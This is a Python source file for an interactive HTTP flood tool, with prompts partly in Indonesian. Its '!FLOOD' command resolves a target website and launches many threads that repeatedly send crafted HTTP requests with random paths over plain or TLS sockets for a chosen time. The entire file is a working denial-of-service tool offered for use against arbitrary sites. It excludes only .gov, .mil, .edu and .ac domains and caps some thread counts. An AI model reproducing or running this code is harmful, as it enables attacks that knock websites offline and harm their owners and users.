try:
    import socket
    import threading
    import string
    import random
    import time
    import os
    import platform
    import sys
    import ssl
    from colorama import Fore
except ModuleNotFoundError as e:
    print(f"{e} CAN'T IMPORT . . . . ")
    exit()

stop_attack = threading.Event()

def clear_text():
    if platform.system().upper() == "WINDOWS":
        os.system('cls')
    else:
        os.system('clear')

def generate_url_path_pyflooder(num):
    msg = string.ascii_letters + string.digits + string.punctuation
    data = "".join(random.sample(msg, int(num)))
    return data

def generate_url_path_choice(num):
    letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
    data = ""
    for _ in range(int(num)):
        data += random.choice(letter)
    return data

def create_socket(ip, port, use_ssl=False):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    if use_ssl:
        context = ssl.create_default_context()
        s = context.wrap_socket(s, server_hostname=ip)
    s.connect((ip, port))
    return s

def DoS_Attack(ip, host, port, type_attack, booter_sent, data_type_loader_packet, use_ssl):
    if stop_attack.is_set():
        return
    
    path_get = ['PY_FLOOD', 'CHOICES_FLOOD']
    path_get_loader = random.choice(path_get)
    
    if path_get_loader == "PY_FLOOD":
        url_path = generate_url_path_pyflooder(5)
    else:
        url_path = generate_url_path_choice(5)

    payload_patterns = {
        'PY': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n\r\n",
        'OWN1': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n\r\n\r\n",
        'OWN2': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n\r\n\r\n\r\n",
        'OWN3': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n\r\n",
        'OWN4': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n\r\n\r\n\r\n\r\n",
        'OWN5': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n\r\n\r\n\r\n\r\n\r\n",
        'OWN6': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n\r\n\r\n",
        'OWN7': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n\r\n",
        'TEST': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n\r\n\r\n",
        'TEST2': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n\r\n\r\n\r\n",
        'TEST3': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n\r\n\r\n",
        'TEST4': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n\r\n\r\n\r\n",
        'TEST5': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n\r\n",
    }
    
    packet_str = payload_patterns.get(data_type_loader_packet, payload_patterns['PY'])
    packet_data = packet_str.encode()

    try:
        s = create_socket(ip, port, use_ssl)
        for _ in range(booter_sent):
            if stop_attack.is_set():
                break
            s.sendall(packet_data)
            s.send(packet_data)
    except Exception:
        pass
    finally:
        try:
            s.shutdown(socket.SHUT_RDWR)
            s.close()
        except:
            pass

def runing_attack(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet, use_ssl):
    while time.time() < time_loader and not stop_attack.is_set():
        for _ in range(min(spam_loader, 10)):  # Limit spam thread count per iteration
            if stop_attack.is_set():
                break
            th = threading.Thread(target=DoS_Attack, args=(ip, host, port_loader, methods_loader, booter_sent, data_type_loader_packet, use_ssl))
            th.start()
            th.join()

def countdown_timer(time_loader):
    remaining = int(time_loader - time.time())
    while remaining > 0 and not stop_attack.is_set():
        sys.stdout.write(f"\r{Fore.YELLOW}Time remaining: {remaining} seconds{Fore.RESET}")
        sys.stdout.flush()
        time.sleep(1)
        remaining = int(time_loader - time.time())
    if stop_attack.is_set():
        print(f"\n{Fore.YELLOW}Serangan Dihentikan{Fore.RESET}")
    else:
        print(f"\n{Fore.GREEN}Serangan Selesai{Fore.RESET}")

def stop_attack_thread():
    # Stop attack when Enter pressed during attack
    input()
    stop_attack.set()
    print(f"\n{Fore.YELLOW}Serangan Dihentikan{Fore.RESET}")

def confirm_exit():
    while True:
        sys.stdout.write(f"\r{Fore.YELLOW}Mau keluar? (y/n): {Fore.RESET}")
        sys.stdout.flush()
        choice = input().lower()
        if choice == 'y':
            print(f"\n{Fore.RED}Program terminated by user (Enter). Exiting...{Fore.RESET}")
            sys.exit(0)
        elif choice == 'n':
            print()  # newline for clean prompt
            return

def command():
    global stop_attack
    while True:
        try:
            data_input_loader = input(f"{Fore.CYAN}COMMAND {Fore.WHITE}${Fore.RESET} ")
            if not data_input_loader:  # Enter pressed at COMMAND prompt
                confirm_exit()
                continue

            args_get = data_input_loader.split(" ")
            if args_get[0].lower() == "clear":
                clear_text()
            elif args_get[0].upper() == "!FLOOD":
                if len(args_get) == 11:
                    data_type_loader_packet = args_get[1].upper()
                    target_loader = args_get[2]
                    port_loader = args_get[3]
                    time_attack = int(args_get[4])
                    spam_loader = int(args_get[5])
                    create_thread = min(int(args_get[6]), 10)  # Limit threads
                    booter_sent = int(args_get[7])
                    methods_loader = args_get[8]
                    spam_create_thread = min(int(args_get[9]), 10)  # Limit threads
                    protocol = args_get[10].lower()

                    # Determine port and SSL usage if port is 0 or auto
                    use_ssl = False
                    try:
                        if port_loader.lower() == "auto" or port_loader == "0":
                            if protocol == "https":
                                port_loader = 443
                                use_ssl = True
                            else:
                                port_loader = 80
                        else:
                            port_loader = int(port_loader)
                            if port_loader == 443 or protocol == "https":
                                use_ssl = True
                    except Exception as e:
                        print(f"{Fore.RED}Port must be integer or 'auto'{Fore.RESET}")
                        continue

                    code_leak = True
                    host = ''
                    ip = ''
                    try:
                        host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
                        if '.gov' in host or '.mil' in host or '.edu' in host or '.ac' in host:
                            code_leak = False
                            print(f"{Fore.GREEN}Uhh You Can't Attack This Website {Fore.WHITE}[ {Fore.YELLOW}.gov .mil .edu .ac {Fore.WHITE}] . . .{Fore.RESET}")
                        else:
                            ip = socket.gethostbyname(host)
                            code_leak = True
                    except socket.gaierror:
                        code_leak = False
                        print(f"{Fore.YELLOW}FAILED TO GET URL . . .{Fore.RESET}")

                    if code_leak:
                        stop_attack.clear()  # Reset stop flag
                        time_loader = time.time() + time_attack
                        print(f"{Fore.LIGHTCYAN_EX}Serangan diMulai\n{Fore.YELLOW}Target: {target_loader}\nPort: {port_loader}\nProtocol: {'HTTPS' if use_ssl else 'HTTP'}\nType: {data_type_loader_packet}\n{Fore.RESET}")

                        # Start attack threads
                        for _ in range(create_thread):
                            for _ in range(spam_create_thread):
                                th = threading.Thread(target=runing_attack, args=(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet, use_ssl))
                                th.daemon = True
                                th.start()

                        # Start countdown timer thread
                        timer_th = threading.Thread(target=countdown_timer, args=(time_loader,))
                        timer_th.daemon = True
                        timer_th.start()

                        # Start stop attack input thread
                        stop_th = threading.Thread(target=stop_attack_thread)
                        stop_th.daemon = True
                        stop_th.start()

                        # Wait attack finish or stopped
                        while not stop_attack.is_set() and time.time() < time_loader:
                            time.sleep(0.1)

                        stop_attack.set()
                        print()  # newline for prompt
                        continue
                else:
                    print(f"{Fore.RED}!FLOOD <TYPE_PACKET> <TARGET> <PORT/auto> <TIME> {Fore.LIGHTRED_EX}<SPAM_THREAD> <CREATE_THREAD> <BOOTER_SENT> {Fore.WHITE}<HTTP_METHODS> <SPAM_CREATE> <PROTOCOL>{Fore.RESET}")
                    print(f"{Fore.CYAN}TYPE_PACKET --> {Fore.WHITE}[ {Fore.LIGHTBLUE_EX}PYF {Fore.WHITE}| TEST TEST2 TEST3 TEST4 TEST5 {Fore.WHITE}| {Fore.BLUE}OWN1 OWN2 OWN3 OWN4 OWN5 OWN6 OWN7 {Fore.WHITE}]\n {Fore.WHITE}[+] {Fore.LIGHTCYAN_EX}TIME (EXAMPLE=250)\n {Fore.WHITE}[+] {Fore.GREEN}SPAM_THREAD (EXAMPLE=299)\n {Fore.WHITE}[+] {Fore.LIGHTGREEN_EX}CREATE_THREAD (EXAMPLE=5)\n {Fore.WHITE}[+] {Fore.LIGHTYELLOW_EX}HTTP_METHODS (EXAMPLE=GATEWAY)\n {Fore.WHITE}[+] {Fore.YELLOW}SPAM_CREATE (EXAMPLE=15)\n {Fore.WHITE}[+] {Fore.MAGENTA}PROTOCOL (http or https){Fore.RESET}")
            else:
                print(f"{Fore.WHITE}[{Fore.YELLOW}+{Fore.WHITE}] {Fore.RED}{data_input_loader} {Fore.LIGHTRED_EX}Not found command{Fore.RESET}")
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}Program terminated by user (Ctrl+C). Exiting...{Fore.RESET}")
            stop_attack.set()
            sys.exit(0)

if __name__ == "__main__":
    try:
        command()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Program terminated by user (Ctrl+C). Exiting...{Fore.RESET}")
        stop_attack.set()
        sys.exit(0)
